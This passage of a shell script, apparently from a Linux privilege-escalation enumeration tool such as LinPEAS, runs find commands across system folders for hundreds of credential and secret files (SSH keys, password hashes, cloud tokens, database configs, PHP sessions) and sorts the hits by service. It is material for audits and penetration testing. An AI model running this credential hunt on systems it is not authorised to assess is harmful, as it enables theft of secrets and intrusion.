\"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_VAR=`eval_bckgrd "find ${ROOT_FOLDER}var -name \"storage.php\" -o -name \"firebase-tools.json\" -o -name \".credentials.json\" -o -name \"jetty-realm.properties\" -o -name \"*.service\" -o -name \".github\" -o -name \"adc.json\" -o -name \".erlang.cookie\" -o -name \"id_rsa*\" -o -name \"*.pem\" -o -name \".plan\" -o -name \"hostapd.conf\" -o -name \"docker.sock\" -o -name \"recentservers.xml\" -o -name \"master.key\" -o -name \"ftp.config\" -o -name \"zabbix_server.conf\" -o -name \"containerd.sock\" -o -name \"*.keystore\" -o -name \"RDCMan.settings\" -o -name \"index.dat\" -o -name \"secrets.yml\" -o -name \".env*\" -o -name \"https.conf\" -o -name \"SecEvent.Evt\" -o -name \"KeePass.config*\" -o -name \".ldaprc\" -o -name \"nginx.conf\" -o -name \".rhosts\" -o -name \"*vnc*.c*nf*\" -o -name \"authorized_hosts\" -o -name \"*.socket\" -o -name \"ftp.ini\" -o -name \"mongod*.conf\" -o -name \"my.cnf\" -o -name \"creds*\" -o -name \"access_tokens.db\" -o -name \"*.sqlite\" -o -name \"api_key\" -o -name \"fastcgi_params\" -o -name \"*.p12\" -o -name \"sitemanager.xml\" -o -name \"*.csr\" -o -name \"KeePass.ini\" -o -name \"unattend.txt\" -o -name \"fat.config\" -o -name \"*.vhd\" -o -name \"*.timer\" -o -name \"elasticsearch.y*ml\" -o -name \"ipsec.secrets\" -o -name \"*.ftpconfig\" -o -name \"*password*\" -o -name \"printers.xml\" -o -name \"wsl.exe\" -o -name \"*.crt\" -o -name \"db.php\" -o -name \"*.pfx\" -o -name \"grafana.ini\" -o -name \"mariadb.cnf\" -o -name \"*.psk\" -o -name \"kcpassword\" -o -name \"pgsql.conf\" -o -name \"access.log\" -o -name \"AppEvent.Evt\" -o -name \".htpasswd\" -o -name \"*.der\" -o -name \"config.xml\" -o -name \".wgetrc\" -o -name \"filezilla.xml\" -o -name \"*.pub\" -o -name \"*.pgp\" -o -name \"FreePBX.conf\" -o -name \".msmtprc\" -o -name \"wcx_ftp.ini\" -o -name \"autounattend.xml\" -o -name \"bitcoin.conf\" -o -name \"iis6.log\" -o -name \"000-default.conf\" -o -name \".lesshst\" -o -name \"pgadmin*.db\" -o -name \"pg_hba.conf\" -o -name \"*.sqlite3\" -o -name \"server.xml\" -o -name \"influxdb.conf\" -o -name \"vsftpd.conf\" -o -name \"pagefile.sys\" -o -name \"unattend.xml\" -o -name \"*.kdbx\" -o -name \"id_dsa*\" -o -name \".sudo_as_admin_successful\" -o -name \"groups.xml\" -o -name \"*config*.php\" -o -name \"*_history*\" -o -name \"ws_ftp.ini\" -o -name \"Elastix.conf\" -o -name \"https-xampp.conf\" -o -name \"psk.txt\" -o -name \"Ntds.dit\" -o -name \"*.vmdk\" -o -name \"appcmd.exe\" -o -name \"*.cer\" -o -name \"amportal.conf\" -o -name \"error.log\" -o -name \"ffftp.ini\" -o -name \"*.gnupg\" -o -name \"smb.conf\" -o -name \"rsyncd.conf\" -o -name \"software.sav\" -o -name \"sysprep.inf\" -o -name \"default.sav\" -o -name \"FreeSSHDservice.ini\" -o -name \".roadtools_auth\" -o -name \"rocketchat.service\" -o -name \"snmpd.conf\" -o -name \"snyk.json\" -o -name \"scclient.exe\" -o -name \"gvm-tools.conf\" -o -name \"gitlab.yml\" -o -name \"dockershim.sock\" -o -name \"kibana.y*ml\" -o -name \"SAM\" -o -name \"tomcat-users.xml\" -o -name \".k5login\" -o -name \"*.jks\" -o -name \"cloud.cfg\" -o -name \"docker-compose.yml\" -o -name \"*.ovpn\" -o -name \"glusterfs.ca\" -o -name \"azureProfile.json\" -o -name \".gitconfig\" -o -name \"legacy_credentials.db\" -o -name \"pwd.ibd\" -o -name \"debian.cnf\" -o -name \"gitlab.rm\" -o -name \"ddclient.conf\" -o -name \"sess_*\" -o -name \"*.keytab\" -o -name \"credentials.xml\" -o -name \".git\" -o -name \"glusterfs.key\" -o -name \"krb5.conf\" -o -name \"httpd.conf\" -o -name \"AzureRMContext.json\" -o -name \"cesi.conf\" -o -name \"*vnc*.xml\" -o -name \"authorized_keys\" -o -name \"passbolt.php\" -o -name \"anaconda-ks.cfg\" -o -name \"sip.conf\" -o -name \"*.viminfo\" -o -name \".flyrc\" -o -name \"autologin\" -o -name \"credentials.db\" -o -name \"krb5cc_*\" -o -name \"frakti.sock\" -o -name \"zabbix_agentd.conf\" -o -name \"supervisord.conf\" -o -name \"known_hosts\" -o -name \"datasources.xml\" -o -name \"*vnc*.txt\" -o -name \"access_tokens.json\" -o -name \"backup\" -o -name \"ipsec.conf\" -o -name \"atlantis.db\" -o -name \"protecteduserkey.bin\" -o -name \"*.swp\" -o -name \"snyk.config.json\" -o -name \"my.ini\" -o -name \"crio.sock\" -o -name \"winscp.ini\" -o -name \".bashrc\" -o -name \"bash.exe\" -o -name \"software\" -o -name \"*.key\" -o -name \"KeePass.enforced*\" -o -name \"passwd\" -o -name \"*.rdg\" -o -name \"*vnc*.ini\" -o -name \"TokenCache.dat\" -o -name \"drives.xml\" -o -name \"mosquitto.conf\" -o -name \"security.sav\" -o -name \"password*.ibd\" -o -name \".secrets.mkey\" -o -name \"unattended.xml\" -o -name \"backups\" -o -name \"Dockerfile\" -o -name \"system.sav\" -o -name \"passwd.ibd\" -o -name \"*.tfstate\" -o -name \"rsyncd.secrets\" -o -name \"pgadmin4.db\" -o -name \"redis.conf\" -o -name \"SYSTEM\" -o -name \"web*.config\" -o -name \"vault-ssh-helper.hcl\" -o -name \"setupinfo.bak\" -o -name \"unattend.inf\" -o -name \"scheduledtasks.xml\" -o -name \"secrets.ldb\" -o -name \"wp-config.php\" -o -name \"database.php\" -o -name \"*.db\" -o -name \"*credential*\" -o -name \"*.keyring\" -o -name \"kadm5.acl\" -o -name \"racoon.conf\" -o -name \"sysprep.xml\" -o -name \"*.vhdx\" -o -name \"accessTokens.json\" -o -name \"plum.sqlite\" -o -name \".pypirc\" -o -name \"config.php\" -o -name \"sites.ini\" -o -name \"ntuser.dat\" -o -name \"hudson.util.Secret\" -o -name \"sssd.conf\" -o -name \"log4j-core*.jar\" -o -name \".boto\" -o -name \"sentry.conf.py\" -o -name \".recently-used.xbel\" -o -name \".vault-token\" -o -name \"settings.php\" -o -name \"php.ini\" -o -name \"hosts.equiv\" -o -name \"glusterfs.pem\" -o -name \"autologin.conf\" -o -name \".profile\" -o -name \"ConsoleHost_history.txt\" -o -name \"rpcd\" -o -name \"docker.socket\" -o -name \"mysqld.cnf\" -o -name \"postgresql.conf\" -o -name \"airflow.cfg\" -o -name \".Xauthority\" -o -name \"webserver_config.py\" -o -name \"setupinfo\" -o -name \".google_authenticator\" -o -name \"NetSetup.log\" -o -name \"*.tf\" -o -name \".git-credentials\" -o -name \"rktlet.sock\" -o -name \"*.gpg\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_CONCOURSE_AUTH=`eval_bckgrd "find ${ROOT_FOLDER}concourse-auth -name \"*.socket\" -o -name \"*.service\" -o -name \"*.timer\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_CONCOURSE_KEYS=`eval_bckgrd "find ${ROOT_FOLDER}concourse-keys -name \"*.socket\" -o -name \"*.service\" -o -name \"*.timer\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`


  wait # Always wait at the end
  CONT_THREADS=0 #Reset the threads counter
fi

if [ "$SEARCH_IN_FOLDER" ] || echo $CHECKS | grep -q procs_crons_timers_srvcs_sockets || echo $CHECKS | grep -q software_information || echo $CHECKS | grep -q interesting_files; then
  # GENERATE THE STORAGES OF THE FOUND FILES
  PSTORAGE_SYSTEMD=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}sys|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}run|^${ROOT_FOLDER}lib|^${ROOT_FOLDER}lib32|^${ROOT_FOLDER}cdrom|^$GREPHOMESEARCH|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}media|^${ROOT_FOLDER}concourse-auth|^${ROOT_FOLDER}systemd|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}system|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}lib64|^${ROOT_FOLDER}concourse-keys|^${ROOT_FOLDER}var" | grep -E ".*\.service$" | sort | uniq | head -n 70)
  PSTORAGE_TIMER=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}sys|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}run|^${ROOT_FOLDER}lib|^${ROOT_FOLDER}lib32|^${ROOT_FOLDER}cdrom|^$GREPHOMESEARCH|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}media|^${ROOT_FOLDER}concourse-auth|^${ROOT_FOLDER}systemd|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}system|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}lib64|^${ROOT_FOLDER}concourse-keys|^${ROOT_FOLDER}var" | grep -E ".*\.timer$" | sort | uniq | head -n 70)
  PSTORAGE_SOCKET=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}sys|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}run|^${ROOT_FOLDER}lib|^${ROOT_FOLDER}lib32|^${ROOT_FOLDER}cdrom|^$GREPHOMESEARCH|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}media|^${ROOT_FOLDER}concourse-auth|^${ROOT_FOLDER}systemd|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}system|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}lib64|^${ROOT_FOLDER}concourse-keys|^${ROOT_FOLDER}var" | grep -E ".*\.socket$" | sort | uniq | head -n 70)
  PSTORAGE_DBUS=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}etc" | grep -E "system\.d$" | sort | uniq | head -n 70)
  PSTORAGE_MYSQL=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -v -E 'mysql/mysql' | grep -E '^/etc/.*mysql|/usr/var/lib/.*mysql|/var/lib/.*mysql' | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "mysql$|passwd\.ibd$|password.*\.ibd$|pwd\.ibd$|mysqld\.cnf$" | sort | uniq | head -n 70)
  PSTORAGE_MARIADB=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "mariadb\.cnf$|debian\.cnf$" | sort | uniq | head -n 70)
  PSTORAGE_POSTGRESQL=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "pgadmin.*\.db$|pg_hba\.conf$|postgresql\.conf$|pgsql\.conf$|pgadmin4\.db$" | sort | uniq | head -n 70)
  PSTORAGE_APACHE_NGINX=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "sites-enabled$|000-default\.conf$|php\.ini$|nginx\.conf$|nginx$" | sort | uniq | head -n 70)
  PSTORAGE_VARNISH=$(echo -e "$FIND_DIR_SNAP\n$FIND_DIR_CONCOURSE_AUTH\n$FIND_DIR_CDROM\n$FIND_DIR_OPT\n$FIND_DIR_PRIVATE\n$FIND_DIR_MNT\n$FIND_DIR_BIN\n$FIND_DIR_VAR\n$FIND_DIR_CACHE\n$FIND_DIR_ETC\n$FIND_DIR_TMP\n$FIND_DIR_USR\n$FIND_DIR_CONCOURSE_KEYS\n$FIND_DIR_SBIN\n$FIND_DIR_SRV\n$FIND_DIR_MEDIA\n$FIND_DIR_HOMESEARCH\n$FIND_DIR_APPLICATIONS\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "varnish$" | sort | uniq | head -n 70)
  PSTORAGE_PHP_SESSIONS=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E '/tmp/.*sess_.*|/var/tmp/.*sess_.*' | grep -E "^${ROOT_FOLDER}mnt|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "sess_.*$" | sort | uniq | head -n 70)
  PSTORAGE_PHP_FILES=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E ".*config.*\.php$|database\.php$|db\.php$|storage\.php$|settings\.php$" | sort | uniq | head -n 70)
  PSTORAGE_APACHE_AIRFLOW=$(echo -e "$FIND_SYSTEMD\n$FIND_HOMESEARCH\n$FIND_MEDIA\n$FIND_BIN\n$FIND_CONCOURSE_KEYS\n$FIND_SBIN\n$FIND_CDROM\n$FIND_ETC\n$FIND_OPT\n$FIND_CACHE\n$FIND_PRIVATE\n$FIND_CONCOURSE_AUTH\n$FIND_VAR\n$FIND_TMP\n$FIND_USR\n$FIND_LIB\n$FIND_MNT\n$FIND_SRV\n$FIND_RUN\n$FIND_LIB64\n$FIND_SNAP\n$FIND_SYS\n$FIND_APPLICATIONS\n$FIND_LIB32\n$FIND_SYSTEM\n$FIND_CUSTOM\n$FIND_DIR_CUSTOM"  | grep -E "^${ROOT_FOLDER}applications|^${ROOT_FOLDER}.cache|^${ROOT_FOLDER}srv|^${ROOT_FOLDER}snap|^${ROOT_FOLDER}cdrom|^${ROOT_FOLDER}mnt|^$GREPHOMESEARCH|^${ROOT_FOLDER}etc|^${ROOT_FOLDER}bin|^${ROOT_FOLDER}opt|^${ROOT_FOLDER}sbin|^${ROOT_FOLDER}tmp|^${ROOT_FOLDER}media|^${ROOT_FOLDER}usr|^${ROOT_FOLDER}private|^${ROOT_FOLDER}var" | grep -E "airflow\.cfg$|webserver_config\.py$" | sort | uniq | head -n 70)
